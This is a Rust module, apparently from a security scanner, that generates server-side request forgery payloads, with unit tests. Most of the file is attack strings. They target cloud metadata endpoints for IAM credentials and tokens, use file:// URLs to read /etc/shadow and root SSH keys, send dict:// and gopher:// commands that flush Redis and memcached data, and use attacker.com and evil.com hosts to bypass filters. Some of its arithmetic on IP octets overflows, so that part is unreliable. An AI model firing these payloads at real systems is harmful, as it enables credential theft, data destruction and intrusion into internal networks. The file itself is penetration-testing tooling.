//! SSRF Payload Generation Module
//!
//! Generates SSRF payloads including IP obfuscation (decimal, hex, octal)
//! and protocol handlers (gopher://, dict://, file://, ldap://, etc.)

use std::net::Ipv4Addr;
use crate::payload::{PayloadEncoder, EncodingType};

/// SSRF payload generator with comprehensive obfuscation techniques
pub struct SsrfPayloadGenerator {
    encoder: PayloadEncoder,
}

impl SsrfPayloadGenerator {
    pub fn new() -> Self {
        Self {
            encoder: PayloadEncoder::new(),
        }
    }

    /// Generate all SSRF payloads for a given target context
    pub fn generate_all(&self, callback_domain: Option<&str>) -> Vec<String> {
        let mut payloads = Vec::with_capacity(200);
        
        payloads.extend(self.generate_localhost_variants());
        payloads.extend(self.generate_private_ips());
        payloads.extend(self.generate_cloud_metadata());
        payloads.extend(self.generate_obfuscated_ips());
        payloads.extend(self.generate_protocol_handlers());
        payloads.extend(self.generate_url_encoding_bypasses());
        payloads.extend(self.generate_dns_rebinding(callback_domain));
        payloads.extend(self.generate_header_injection());
        
        payloads
    }

    /// Localhost and loopback variants
    fn generate_localhost_variants(&self) -> Vec<String> {
        vec![
            "http://localhost".to_string(),
            "http://localhost:80".to_string(),
            "http://localhost:8080".to_string(),
            "http://localhost:3000".to_string(),
            "http://localhost:5000".to_string(),
            "http://localhost:8000".to_string(),
            "http://localhost:9000".to_string(),
            "http://127.0.0.1".to_string(),
            "http://127.0.0.1:80".to_string(),
            "http://127.0.0.1:8080".to_string(),
            "http://127.0.0.1:3000".to_string(),
            "http://127.0.0.1:5000".to_string(),
            "http://127.0.0.1:8000".to_string(),
            "http://127.0.0.1:9000".to_string(),
            "http://127.1".to_string(),
            "http://127.0.1".to_string(),
            "http://127.0.0.1".to_string(),
            "http://127.0.0.01".to_string(),
            "http://[::1]".to_string(),
            "http://[::1]:80".to_string(),
            "http://[::1]:8080".to_string(),
            "http://[::ffff:7f00:1]".to_string(),
            "http://[0:0:0:0:0:ffff:7f00:1]".to_string(),
            "http://0.0.0.0".to_string(),
            "http://0.0.0.0:80".to_string(),
        ]
    }

    /// Private IP ranges (RFC 1918)
    fn generate_private_ips(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(50);
        
        // 10.0.0.0/8
        for ip in [1, 2, 10, 100, 254, 255] {
            payloads.push(format!("http://10.0.0.{}", ip));
            payloads.push(format!("http://10.0.0.{}:80", ip));
            payloads.push(format!("http://10.0.0.{}:8080", ip));
        }
        
        // 172.16.0.0/12
        for second in [16, 17, 20, 24, 31] {
            for ip in [1, 2, 254] {
                payloads.push(format!("http://172.{}.0.{}", second, ip));
                payloads.push(format!("http://172.{}.0.{}:80", second, ip));
            }
        }
        
        // 192.168.0.0/16
        for third in [0, 1, 2, 10, 100, 255] {
            for ip in [1, 2, 100, 254] {
                payloads.push(format!("http://192.168.{}.{}", third, ip));
                payloads.push(format!("http://192.168.{}.{}:80", third, ip));
                payloads.push(format!("http://192.168.{}.{}:8080", third, ip));
            }
        }
        
        // Link-local 169.254.0.0/16
        payloads.extend_from_slice(&[
            "http://169.254.169.254",
            "http://169.254.169.254:80",
            "http://169.254.169.254:8080",
            "http://169.254.169.254:8000",
            "http://169.254.0.1",
            "http://169.254.255.254",
            "http://[fe80::1]",
            "http://[fe80::1]:80",
        ]);
        
        payloads
    }

    /// Cloud metadata service endpoints
    fn generate_cloud_metadata(&self) -> Vec<String> {
        vec![
            // AWS
            "http://169.254.169.254/latest/meta-data/".to_string(),
            "http://169.254.169.254/latest/meta-data/ami-id".to_string(),
            "http://169.254.169.254/latest/meta-data/instance-id".to_string(),
            "http://169.254.169.254/latest/meta-data/instance-type".to_string(),
            "http://169.254.169.254/latest/meta-data/local-ipv4".to_string(),
            "http://169.254.169.254/latest/meta-data/public-ipv4".to_string(),
            "http://169.254.169.254/latest/meta-data/security-groups".to_string(),
            "http://169.254.169.254/latest/meta-data/iam/".to_string(),
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
            "http://169.254.169.254/latest/user-data/".to_string(),
            "http://169.254.169.254/latest/dynamic/instance-identity/document".to_string(),
            
            // AWS IMDSv2
            "http://169.254.169.254/latest/api/token".to_string(),
            
            // GCP
            "http://metadata.google.internal/computeMetadata/v1/".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/project/project-id".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/id".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/zone".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/machine-type".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/".to_string(),
            
            // Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01".to_string(),
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01".to_string(),
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/".to_string(),
            "http://metadata.azure.com/metadata/instance?api-version=2021-02-01".to_string(),
            
            // DigitalOcean
            "http://169.254.169.254/metadata/v1.json".to_string(),
            "http://169.254.169.254/metadata/v1/id".to_string(),
            "http://169.254.169.254/metadata/v1/region".to_string(),
            "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address".to_string(),
            
            // Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/".to_string(),
            "http://100.100.100.200/latest/meta-data/instance-id".to_string(),
            "http://100.100.100.200/latest/meta-data/region-id".to_string(),
            
            // Oracle Cloud
            "http://169.254.169.254/opc/v2/instance/".to_string(),
            "http://169.254.169.254/opc/v2/identity/".to_string(),
        ]
    }

    /// IP obfuscation techniques (decimal, hex, octal, mixed)
    fn generate_obfuscated_ips(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(60);
        
        // 127.0.0.1 = 2130706433 in decimal
        payloads.extend_from_slice(&[
            "http://2130706433".to_string(),
            "http://2130706433:80".to_string(),
            "http://2130706433:8080".to_string(),
            "http://0x7f000001".to_string(),
            "http://0x7F000001".to_string(),
            "http://0x7f.0x00.0x00.0x01".to_string(),
            "http://017700000001".to_string(),
            "http://0177.0.0.1".to_string(),
            "http://0177.00.00.01".to_string(),
            "http://127.0.0.01".to_string(),
            "http://127.1".to_string(),
            "http://127.0.1".to_string(),
            "http://127.000.000.001".to_string(),
        ]);
        
        // 169.254.169.254 = 2852039166 in decimal
        payloads.extend_from_slice(&[
            "http://2852039166".to_string(),
            "http://2852039166:80".to_string(),
            "http://0xa9fea9fe".to_string(),
            "http://0xA9FEA9FE".to_string(),
            "http://025177652376".to_string(),
        ]);
        
        // 10.0.0.1 = 167772161
        payloads.extend_from_slice(&[
            "http://167772161".to_string(),
            "http://0x0a000001".to_string(),
            "http://012.0.0.1".to_string(),
        ]);
        
        // 192.168.1.1 = 3232235777
        payloads.extend_from_slice(&[
            "http://3232235777".to_string(),
            "http://0xc0a80101".to_string(),
            "http://0300.0250.01.01".to_string(),
        ]);
        
        // IPv6 obfuscation
        payloads.extend_from_slice(&[
            "http://[::ffff:7f00:1]".to_string(),
            "http://[::ffff:127.0.0.1]".to_string(),
            "http://[0:0:0:0:0:ffff:7f00:1]".to_string(),
            "http://[::ffff:a9fe:a9fe]".to_string(), // 169.254.169.254
            "http://[::ffff:c0a8:101]".to_string(),   // 192.168.1.1
        ]);
        
        // Dotted decimal with overflow
        payloads.extend_from_slice(&[
            "http://127.256.0.1".to_string(),  // 127.0.0.1 (256 wraps)
            "http://127.0.256.1".to_string(),
            "http://127.0.0.256".to_string(),
            "http://256.256.256.256".to_string(),
        ]);
        
        payloads
    }

    /// Protocol handlers for SSRF exploitation
    fn generate_protocol_handlers(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(80);
        
        // file:// protocol
        payloads.extend_from_slice(&[
            "file:///etc/passwd".to_string(),
            "file:///etc/hosts".to_string(),
            "file:///proc/self/environ".to_string(),
            "file:///proc/version".to_string(),
            "file:///proc/net/tcp".to_string(),
            "file:///proc/net/udp".to_string(),
            "file:///proc/self/cmdline".to_string(),
            "file:///proc/self/fd/0".to_string(),
            "file:///var/log/apache2/access.log".to_string(),
            "file:///var/log/nginx/access.log".to_string(),
            "file:///var/log/httpd/access_log".to_string(),
            "file:///var/log/auth.log".to_string(),
            "file:///etc/shadow".to_string(),
            "file:///etc/ssh/sshd_config".to_string(),
            "file:///root/.ssh/id_rsa".to_string(),
            "file:///home/*/.ssh/id_rsa".to_string(),
            "file:///C:/Windows/System32/drivers/etc/hosts".to_string(),
            "file:///C:/Windows/win.ini".to_string(),
            "file:///C:/boot.ini".to_string(),
        ]);
        
        // file:// with UNC paths (Windows)
        payloads.extend_from_slice(&[
            "file://attacker.com/share/file".to_string(),
            "file://192.168.1.100/share/file".to_string(),
            "file://localhost/share/file".to_string(),
        ]);
        
        // dict:// protocol
        payloads.extend_from_slice(&[
            "dict://127.0.0.1:6379/INFO".to_string(),
            "dict://127.0.0.1:6379/CLIENT LIST".to_string(),
            "dict://127.0.0.1:6379/CONFIG GET *".to_string(),
            "dict://127.0.0.1:6379/KEYS *".to_string(),
            "dict://127.0.0.1:11211/stats".to_string(),
            "dict://127.0.0.1:11211/version".to_string(),
            "dict://127.0.0.1:11211/items".to_string(),
            "dict://127.0.0.1:9200/_cluster/health".to_string(),
            "dict://127.0.0.1:9200/_cat/indices".to_string(),
            "dict://127.0.0.1:27017/admin".to_string(),
            "dict://127.0.0.1:5432/".to_string(),
            "dict://127.0.0.1:3306/".to_string(),
            "dict://127.0.0.1:6379/".to_string(),
            "dict://127.0.0.1:11211/".to_string(),
            "dict://127.0.0.1:9200/".to_string(),
            "dict://127.0.0.1:27017/".to_string(),
            "dict://127.0.0.1:5432/".to_string(),
            "dict://127.0.0.1:3306/".to_string(),
            "dict://127.0.0.1:6379/FLUSHALL".to_string(),
            "dict://127.0.0.1:11211/flush_all".to_string(),
        ]);
        
        // gopher:// protocol
        payloads.extend_from_slice(&[
            "gopher://127.0.0.1:6379/_INFO".to_string(),
            "gopher://127.0.0.1:6379/_CLIENT%20LIST".to_string(),
            "gopher://127.0.0.1:6379/_CONFIG%20GET%20*".to_string(),
            "gopher://127.0.0.1:6379/_KEYS%20*".to_string(),
            "gopher://127.0.0.1:11211/_stats".to_string(),
            "gopher://127.0.0.1:11211/_version".to_string(),
            "gopher://127.0.0.1:11211/_flush_all".to_string(),
            "gopher://127.0.0.1:9200/_/_cluster/health".to_string(),
            "gopher://127.0.0.1:9200/_/_cat/indices".to_string(),
            "gopher://127.0.0.1:25/_HELO%20localhost".to_string(),
            "gopher://127.0.0.1:25/_MAIL%20FROM%3A%3Ctest%40test.com%3E".to_string(),
            "gopher://127.0.0.1:25/_RCPT%20TO%3A%3Cvictim%40example.com%3E".to_string(),
            "gopher://127.0.0.1:25/_DATA".to_string(),
            "gopher://127.0.0.1:25/_.".to_string(),
            "gopher://127.0.0.1:25/_QUIT".to_string(),
        ]);
        
        // ldap:// protocol
        payloads.extend_from_slice(&[
            "ldap://127.0.0.1:389/".to_string(),
            "ldap://127.0.0.1:389/dc=example,dc=com".to_string(),
            "ldap://127.0.0.1:636/".to_string(),  // LDAPS
            "ldap://127.0.0.1:389/ou=users,dc=example,dc=com".to_string(),
        ]);
        
        // tftp:// protocol
        payloads.extend_from_slice(&[
            "tftp://127.0.0.1:69/etc/passwd".to_string(),
            "tftp://127.0.0.1:69/etc/hosts".to_string(),
        ]);
        
        // sftp:// protocol
        payloads.extend_from_slice(&[
            "sftp://127.0.0.1:22/etc/passwd".to_string(),
            "sftp://127.0.0.1:22/etc/hosts".to_string(),
        ]);
        
        // ssh:// protocol
        payloads.extend_from_slice(&[
            "ssh://127.0.0.1:22/".to_string(),
        ]);
        
        payloads
    }

    /// URL encoding bypasses
    fn generate_url_encoding_bypasses(&self) -> Vec<String> {
        let mut payloads = Vec::with_capacity(40);
        
        // Double encoding
        payloads.extend_from_slice(&[
            "http://127.0.0.1%23".to_string(),
            "http://127.0.0.1%23@evil.com".to_string(),
            "http://127.0.0.1%2523".to_string(),
            "http://127.0.0.1%2523@evil.com".to_string(),
            "http://127.0.0.1%253A%252F%252Fevil.com".to_string(),
        ]);
        
        // URL fragment bypass
        payloads.extend_from_slice(&[
            "http://127.0.0.1#@evil.com".to_string(),
            "http://127.0.0.1#.evil.com".to_string(),
            "http://127.0.0.1#".to_string(),
        ]);
        
        // URL userinfo bypass
        payloads.extend_from_slice(&[
            "http://user:pass@127.0.0.1".to_string(),
            "http://user@127.0.0.1".to_string(),
            "http://127.0.0.1@evil.com".to_string(),
            "http://127.0.0.1:80@evil.com".to_string(),
        ]);
        
        // Path traversal in URL
        payloads.extend_from_slice(&[
            "http://127.0.0.1/../etc/passwd".to_string(),
            "http://127.0.0.1/..;/etc/passwd".to_string(),
            "http://127.0.0.1/..%2fetc%2fpasswd".to_string(),
            "http://127.0.0.1/..%252fetc%252fpasswd".to_string(),
            "http://127.0.0.1/%2e%2e/%2e%2e/etc/passwd".to_string(),
        ]);
        
        // IPv6 zone ID bypass
        payloads.extend_from_slice(&[
            "http://[::1%25eth0]".to_string(),
            "http://[::1%eth0]".to_string(),
        ]);
        
        // Mixed case
        payloads.extend_from_slice(&[
            "HTTP://127.0.0.1".to_string(),
            "Http://127.0.0.1".to_string(),
            "hTtP://127.0.0.1".to_string(),
        ]);
        
        // Extra slashes
        payloads.extend_from_slice(&[
            "http://127.0.0.1//".to_string(),
            "http://127.0.0.1///".to_string(),
            "http:///127.0.0.1/".to_string(),
            "http:\\\\127.0.0.1".to_string(),
        ]);
        
        payloads
    }

    /// DNS rebinding payloads
    fn generate_dns_rebinding(&self, callback_domain: Option<&str>) -> Vec<String> {
        let mut payloads = Vec::with_capacity(20);
        
        // nip.io / sslip.io style domains
        payloads.extend_from_slice(&[
            "http://127.0.0.1.nip.io".to_string(),
            "http://10.0.0.1.nip.io".to_string(),
            "http://192.168.1.1.nip.io".to_string(),
            "http://169.254.169.254.nip.io".to_string(),
            "http://127.0.0.1.sslip.io".to_string(),
            "http://10.0.0.1.sslip.io".to_string(),
            "http://192.168.1.1.sslip.io".to_string(),
            "http://169.254.169.254.sslip.io".to_string(),
            "http://localhost.nip.io".to_string(),
            "http://localhost.sslip.io".to_string(),
            "http://internal.nip.io".to_string(),
            "http://internal.sslip.io".to_string(),
        ]);
        
        // Custom callback domain for rebinding
        if let Some(domain) = callback_domain {
            payloads.push(format!("http://rb.127.0.0.1.{}", domain));
            payloads.push(format!("http://rb.localhost.{}", domain));
            payloads.push(format!("http://rb.internal.{}", domain));
            payloads.push(format!("http://rebind.127.0.0.1.{}", domain));
        }
        
        payloads
    }

    /// Header injection payloads for SSRF via headers
    fn generate_header_injection(&self) -> Vec<String> {
        vec![
            // X-Forwarded-For injection
            "127.0.0.1".to_string(),
            "10.0.0.1".to_string(),
            "192.168.1.1".to_string(),
            "169.254.169.254".to_string(),
            "localhost".to_string(),
            "[::1]".to_string(),
            
            // X-Original-URL / X-Rewrite-URL
            "http://127.0.0.1/admin".to_string(),
            "http://127.0.0.1/internal".to_string(),
            "http://169.254.169.254/latest/meta-data/".to_string(),
            
            // Host header injection
            "127.0.0.1".to_string(),
            "127.0.0.1:8080".to_string(),
            "localhost".to_string(),
            "localhost:8080".to_string(),
            "169.254.169.254".to_string(),
            "metadata.google.internal".to_string(),
            "metadata.azure.com".to_string(),
        ]
    }

    /// Encode payload for specific injection context
    pub fn encode_for_context(&self, payload: &str, context: &crate::payload::InjectionContext) -> String {
        match context {
            crate::payload::InjectionContext::UrlQuery => {
                self.encoder.encode(payload, EncodingType::Url)
            }
            crate::payload::InjectionContext::UrlPath => {
                self.encoder.encode(payload, EncodingType::UrlPath)
            }
            crate::payload::InjectionContext::Header => {
                self.encoder.encode(payload, EncodingType::Header)
            }
            crate::payload::InjectionContext::Cookie => {
                self.encoder.encode(payload, EncodingType::Cookie)
            }
            crate::payload::InjectionContext::BodyForm => {
                self.encoder.encode(payload, EncodingType::Form)
            }
            crate::payload::InjectionContext::BodyJson => {
                self.encoder.encode(payload, EncodingType::Json)
            }
            crate::payload::InjectionContext::BodyXml => {
                self.encoder.encode(payload, EncodingType::Xml)
            }
            _ => payload.to_string(),
        }
    }

    /// Generate IPv4 address in decimal format
    pub fn ipv4_to_decimal(ip: &str) -> Option<u32> {
        ip.parse::<Ipv4Addr>().ok().map(|addr| u32::from(addr))
    }

    /// Generate IPv4 address in hex format
    pub fn ipv4_to_hex(ip: &str) -> Option<String> {
        Self::ipv4_to_decimal(ip).map(|d| format!("0x{:08x}", d))
    }

    /// Generate IPv4 address in octal format
    pub fn ipv4_to_octal(ip: &str) -> Option<String> {
        Self::ipv4_to_decimal(ip).map(|d| format!("0{:011o}", d))
    }

    /// Generate all obfuscation variants for a single IP
    pub fn generate_ip_variants(ip: &str) -> Vec<String> {
        let mut variants = Vec::new();
        
        // Original
        variants.push(format!("http://{}", ip));
        variants.push(format!("http://{}:80", ip));
        variants.push(format!("http://{}:8080", ip));
        
        // Decimal
        if let Some(dec) = Self::ipv4_to_decimal(ip) {
            variants.push(format!("http://{}", dec));
            variants.push(format!("http://{}:80", dec));
        }
        
        // Hex
        if let Some(hex) = Self::ipv4_to_hex(ip) {
            variants.push(format!("http://{}", hex));
            variants.push(format!("http://{}:80", hex));
        }
        
        // Octal
        if let Some(oct) = Self::ipv4_to_octal(ip) {
            variants.push(format!("http://{}", oct));
            variants.push(format!("http://{}:80", oct));
        }
        
        // Dotted variations
        let parts: Vec<&str> = ip.split('.').collect();
        if parts.len() == 4 {
            variants.push(format!("http://{}.{}.{}.{}", parts[0], parts[1], parts[2], parts[3]));
            variants.push(format!("http://{}.{}.{}", parts[0], parts[1], parts[2].parse::<u8>().unwrap_or(0) * 256 + parts[3].parse::<u8>().unwrap_or(0)));
            variants.push(format!("http://{}.{}", parts[0], parts[1].parse::<u8>().unwrap_or(0) * 65536 + parts[2].parse::<u8>().unwrap_or(0) * 256 + parts[3].parse::<u8>().unwrap_or(0)));
        }
        
        variants
    }
}

impl Default for SsrfPayloadGenerator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_all() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_all(Some("test.oob.example.com"));
        
        assert!(!payloads.is_empty());
        assert!(payloads.len() > 100);
    }

    #[test]
    fn test_localhost_variants() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_localhost_variants();
        
        assert!(payloads.iter().any(|p| p.contains("127.0.0.1")));
        assert!(payloads.iter().any(|p| p.contains("localhost")));
        assert!(payloads.iter().any(|p| p.contains("[::1]")));
    }

    #[test]
    fn test_private_ips() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_private_ips();
        
        assert!(payloads.iter().any(|p| p.starts_with("http://10.")));
        assert!(payloads.iter().any(|p| p.starts_with("http://172.")));
        assert!(payloads.iter().any(|p| p.starts_with("http://192.168.")));
        assert!(payloads.iter().any(|p| p.starts_with("http://169.254.")));
    }

    #[test]
    fn test_cloud_metadata() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_cloud_metadata();
        
        assert!(payloads.iter().any(|p| p.contains("169.254.169.254")));
        assert!(payloads.iter().any(|p| p.contains("metadata.google.internal")));
        assert!(payloads.iter().any(|p| p.contains("metadata.azure.com")));
        assert!(payloads.iter().any(|p| p.contains("100.100.100.200")));
    }

    #[test]
    fn test_obfuscated_ips() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_obfuscated_ips();
        
        assert!(payloads.iter().any(|p| p.contains("2130706433"))); // decimal
        assert!(payloads.iter().any(|p| p.contains("0x7f000001"))); // hex
        assert!(payloads.iter().any(|p| p.contains("0177"))); // octal
        assert!(payloads.iter().any(|p| p.contains("[::ffff:7f00:1]"))); // IPv6
    }

    #[test]
    fn test_protocol_handlers() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_protocol_handlers();
        
        assert!(payloads.iter().any(|p| p.starts_with("file://")));
        assert!(payloads.iter().any(|p| p.starts_with("dict://")));
        assert!(payloads.iter().any(|p| p.starts_with("gopher://")));
        assert!(payloads.iter().any(|p| p.starts_with("ldap://")));
        assert!(payloads.iter().any(|p| p.starts_with("tftp://")));
    }

    #[test]
    fn test_url_encoding_bypasses() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_url_encoding_bypasses();
        
        assert!(payloads.iter().any(|p| p.contains("%23")));
        assert!(payloads.iter().any(|p| p.contains("%2523")));
        assert!(payloads.iter().any(|p| p.contains("#@")));
        assert!(payloads.iter().any(|p| p.contains("@evil.com")));
    }

    #[test]
    fn test_dns_rebinding() {
        let generator = SsrfPayloadGenerator::new();
        let payloads = generator.generate_dns_rebinding(Some("test.oob.example.com"));
        
        assert!(payloads.iter().any(|p| p.contains("nip.io")));
        assert!(payloads.iter().any(|p| p.contains("sslip.io")));
        assert!(payloads.iter().any(|p| p.contains("test.oob.example.com")));
    }

    #[test]
    fn test_ipv4_conversions() {
        assert_eq!(SsrfPayloadGenerator::ipv4_to_decimal("127.0.0.1"), Some(2130706433));
        assert_eq!(SsrfPayloadGenerator::ipv4_to_decimal("169.254.169.254"), Some(2852039166));
        assert_eq!(SsrfPayloadGenerator::ipv4_to_decimal("10.0.0.1"), Some(167772161));
        assert_eq!(SsrfPayloadGenerator::ipv4_to_decimal("192.168.1.1"), Some(3232235777));
        
        assert_eq!(SsrfPayloadGenerator::ipv4_to_hex("127.0.0.1"), Some("0x7f000001".to_string()));
        assert_eq!(SsrfPayloadGenerator::ipv4_to_hex("169.254.169.254"), Some("0xa9fea9fe".to_string()));
        
        assert_eq!(SsrfPayloadGenerator::ipv4_to_octal("127.0.0.1"), Some("017700000001".to_string()));
    }

    #[test]
    fn test_generate_ip_variants() {
        let variants = SsrfPayloadGenerator::generate_ip_variants("127.0.0.1");
        
        assert!(variants.iter().any(|v| v.contains("127.0.0.1")));
        assert!(variants.iter().any(|v| v.contains("2130706433")));
        assert!(variants.iter().any(|v| v.contains("0x7f000001")));
        assert!(variants.iter().any(|v| v.contains("017700000001")));
    }

    #[test]
    fn test_encode_for_context() {
        let generator = SsrfPayloadGenerator::new();
        let payload = "http://127.0.0.1/admin";
        
        let url_encoded = generator.encode_for_context(payload, &crate::payload::InjectionContext::UrlQuery);
        assert!(url_encoded.contains("%3A"));
        assert!(url_encoded.contains("%2F"));
        
        let header_encoded = generator.encode_for_context(payload, &crate::payload::InjectionContext::Header);
        assert!(!header_encoded.contains("\n"));
        assert!(!header_encoded.contains("\r"));
    }
}